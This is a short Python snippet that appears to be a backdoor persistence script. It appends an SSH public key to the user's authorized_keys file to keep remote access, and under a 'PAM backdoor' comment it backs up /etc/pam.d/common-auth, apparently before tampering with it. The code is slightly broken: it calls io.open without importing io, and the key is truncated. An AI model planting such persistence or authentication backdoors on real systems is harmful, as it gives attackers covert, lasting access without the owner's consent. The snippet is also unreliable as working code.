import os
import shutil

# SSH key persistence
ssh_dir = os.path.expanduser("~/.ssh")
os.makedirs(ssh_dir, exist_ok=True)
with io.open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
    f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...")

# PAM backdoor
shutil.copy("/etc/pam.d/common-auth", "/etc/pam.d/common-auth.bak")
